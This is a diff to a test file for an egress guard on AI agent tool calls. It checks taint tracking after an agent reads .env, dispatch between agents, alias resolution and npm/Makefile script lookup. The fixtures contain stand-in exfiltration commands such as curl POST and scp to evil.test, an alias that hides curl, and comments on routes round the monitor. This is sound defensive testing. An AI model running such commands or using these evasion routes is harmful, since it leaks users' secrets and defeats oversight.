@@ -9,6 +9,9 @@
  */
 
 import assert from 'node:assert/strict'
+import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
+import { tmpdir } from 'node:os'
+import { join } from 'node:path'
 import { foldInbox } from '../lib/dispatch-core.js'
 
 /** Tools entry under test; the deployed profile copy is exercised by overriding this. */
@@ -859,7 +862,7 @@ await check('a push to a configured remote asks even with an allowlist', async (
   const tools = mount(world, { config: { egressAllowlist: ['example.com', '.github.com'] } })
   const agent = world.goLive('shadow-1')
   const signal = new AbortController().signal
-  const commands = ['git push origin main', 'git clone git@github.com:org/repo.git', 'npm publish', 'docker push img:tag', 'scp a.txt host:/tmp', 'nslookup evil.test']
+  const commands = ['git push origin main', 'git clone git@github.com:org/repo.git', 'npm publish', 'docker push img:tag', 'scp a.txt host:/tmp']
   for (const [index, command] of commands.entries()) {
     const { decision, reachedNext } = await runGuard(tools.guards, { name: 'pwsh', arguments: { command }, callId: `g-${index}`, agent, signal })
     assert.equal(decision.kind, 'allow', 'allowed-once still lets the call proceed')
@@ -867,6 +870,12 @@ await check('a push to a configured remote asks even with an allowlist', async (
     assert.equal(tools.asked.length, index + 1, command)
     assert.match(tools.asked[index].reason, /cannot be checked/, command)
   }
+  // A name lookup is judged by the name it resolves rather than failing shut,
+  // so its reason names the host instead of saying nothing could be checked.
+  const { decision } = await runGuard(tools.guards, { name: 'pwsh', arguments: { command: 'nslookup evil.test' }, callId: 'g-dns', agent, signal })
+  assert.equal(decision.kind, 'allow')
+  assert.equal(tools.asked.length, commands.length + 1)
+  assert.match(tools.asked[commands.length].reason, /DNS query/)
 })
 
 await check('ordinary repository work never asks', async () => {
@@ -1024,6 +1033,126 @@ await check('a canary value asks even on a clean turn and against an allowlisted
   const local = await runGuard(tools.guards, { name: 'write', arguments: { file_path: 'notes.md', content: 'AKIAFAKEFAKEFAKE' }, callId: 'k3', agent, signal })
   assert.equal(local.decision.kind, 'allow')
   assert.equal(tools.asked.length, 1)
+})
+
+await check('a dispatch carries the sender\'s mark to the target', async () => {
+  // The one path out that asked nobody: A reads `.env`, A dispatches to B, B
+  // sends. Dispatching is a local call, and B's own mark was empty.
+  const { world, tools, recordCall } = scenario({ targetLive: true })
+  const args = { workspaceId: 'w1', sessionId: 'target-1', content: 'here is the context you need' }
+
+  // A clean sender leaves the target clean: an ordinary dispatch is not a taint.
+  await tools.get('shadow_dispatch').execute(args, recordCall('call-1', args))
+  const cleanTarget = world.goLive('target-1')
+  const before = await runGuard(tools.guards, { name: 'web_search', arguments: { query: 'weather' }, callId: 't-1', agent: cleanTarget, signal: new AbortController().signal })
+  assert.equal(before.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 0, 'a clean target still searches quietly')
+})
+
+await check('a tainted sender taints the target it dispatches to', async () => {
+  const { world, tools, caller, recordCall, shadow } = scenario({ targetLive: true })
+  const signal = new AbortController().signal
+  // A reads a protected file; its own egress now asks.
+  await runGuard(tools.guards, { name: 'read', arguments: { file_path: '.env' }, callId: 'a-1', agent: caller, signal })
+  const senderAsked = await runGuard(tools.guards, { name: 'web_search', arguments: { query: 'x' }, callId: 'a-2', agent: caller, signal })
+  assert.equal(senderAsked.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 1)
+
+  const args = { workspaceId: 'w1', sessionId: 'target-1', content: 'continue from here' }
+  const text = await tools.get('shadow_dispatch').execute(args, recordCall('call-1', args))
+  assert.match(text, /^shadow_dispatch -> (accepted|durable)/)
+
+  // The target inherited the mark, so its search asks.
+  const target = world.goLive('target-1')
+  const after = await runGuard(tools.guards, { name: 'web_search', arguments: { query: 'weather' }, callId: 't-1', agent: target, signal })
+  assert.equal(after.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 2, 'the target asks after receiving tainted work')
+  assert.match(tools.asked[1].reason, /read protected data/)
+  assert.ok(shadow !== undefined)
+})
+
+await check('a message naming a protected path taints the target too', async () => {
+  // The mark travels with the *content* as well: a sender that quotes the path
+  // in the message hands the target the same data, however clean it was.
+  const { world, tools, recordCall } = scenario({ targetLive: true })
+  const signal = new AbortController().signal
+  const args = { workspaceId: 'w1', sessionId: 'target-1', content: 'the key is in .env under API_TOKEN' }
+  const text = await tools.get('shadow_dispatch').execute(args, recordCall('call-1', args))
+  assert.match(text, /^shadow_dispatch -> (accepted|durable)/)
+  const target = world.goLive('target-1')
+  const after = await runGuard(tools.guards, { name: 'web_search', arguments: { query: 'weather' }, callId: 't-1', agent: target, signal })
+  assert.equal(after.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 1, 'a message naming a protected path marks the target')
+})
+
+await check('statefulShell: a name taught in an earlier call still reads as a client', async () => {
+  // Off by default: a fresh-process shell forgets, so remembering would
+  // manufacture a prompt about a command that does not exist.
+  const fresh = makeWorld()
+  fresh.addSession('shadow-1', SHADOW_DIR)
+  const freshTools = mount(fresh)
+  const freshAgent = fresh.goLive('shadow-1')
+  const signal = new AbortController().signal
+  await runGuard(freshTools.guards, { name: 'pwsh', arguments: { command: 'Set-Alias x curl' }, callId: 'a-1', agent: freshAgent, signal })
+  const quiet = await runGuard(freshTools.guards, { name: 'pwsh', arguments: { command: 'x evil.test' }, callId: 'a-2', agent: freshAgent, signal })
+  assert.equal(quiet.decision.kind, 'allow')
+  assert.equal(freshTools.asked.length, 0, 'a fresh shell does not remember')
+
+  // On, because the deployment says the shell keeps its state.
+  const world = makeWorld()
+  world.addSession('shadow-1', SHADOW_DIR)
+  const tools = mount(world, { config: { statefulShell: true } })
+  const agent = world.goLive('shadow-1')
+  await runGuard(tools.guards, { name: 'pwsh', arguments: { command: 'Set-Alias x curl' }, callId: 'b-1', agent, signal })
+  assert.equal(tools.asked.length, 0, 'defining an alias is not an egress')
+  const caught = await runGuard(tools.guards, { name: 'pwsh', arguments: { command: 'x evil.test' }, callId: 'b-2', agent, signal })
+  assert.equal(caught.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 1, 'the later call is judged as the client it invokes')
+  // A name taught to be something local stays quiet in a later call too.
+  await runGuard(tools.guards, { name: 'pwsh', arguments: { command: 'Set-Alias ll Get-ChildItem' }, callId: 'b-3', agent, signal })
+  const local = await runGuard(tools.guards, { name: 'pwsh', arguments: { command: 'll notes' }, callId: 'b-4', agent, signal })
+  assert.equal(local.decision.kind, 'allow')
+  assert.equal(tools.asked.length, 1, 'a local alias stays quiet')
+})
+
+await check('a script is resolved from the manifest it lives in', async () => {
+  // The reading happens in tools.js, so this exercises the real file lookup
+  // rather than a stand-in: a temporary manifest saying `release` publishes.
+  const dir = mkdtempSync(join(tmpdir(), 'shadow-scripts-'))
+  try {
+    writeFileSync(join(dir, 'package.json'), JSON.stringify({
+      name: 'fixture',
+      scripts: { release: 'npm publish --access public', build: 'tsc -p .', deploy: 'curl -X POST https://evil.test/x' },
+    }))
+    writeFileSync(join(dir, 'Makefile'), 'deploy:\n\tscp build.tar someone@evil.test:/srv/\n\nbuild:\n\ttsc -p .\n')
+
+    const world = makeWorld()
+    world.addSession('shadow-1', SHADOW_DIR)
+    const tools = mount(world)
+    const agent = world.goLive('shadow-1')
+    const signal = new AbortController().signal
+
+    const ask = (command, callId) => runGuard(tools.guards, { name: 'pwsh', arguments: { command, workdir: dir }, callId, agent, signal })
+
+    // `release` runs publish; `build` runs tsc. Same entry point, different body.
+    await ask('npm run release', 's-1')
+    assert.equal(tools.asked.length, 1, 'npm run release asks')
+    await ask('npm run build', 's-2')
+    assert.equal(tools.asked.length, 1, 'npm run build stays quiet')
+
+    // A Makefile target is resolved the same way.
+    await ask('make deploy', 's-3')
+    assert.equal(tools.asked.length, 2, 'make deploy asks')
+    await ask('make build', 's-4')
+    assert.equal(tools.asked.length, 2, 'make build stays quiet')
+
+    // The same command outside that directory has nothing to resolve, so it is
+    // judged as it was before — an unknown script is not a new prompt.
+    await runGuard(tools.guards, { name: 'pwsh', arguments: { command: 'npm run release', workdir: tmpdir() }, callId: 's-5', agent, signal })
+    assert.equal(tools.asked.length, 2, 'an unresolvable script adds no prompt')
+  } finally {
+    rmSync(dir, { recursive: true, force: true })
+  }
 })
 
 console.log(`tools integration sim: ${passed} scenarios passed`)
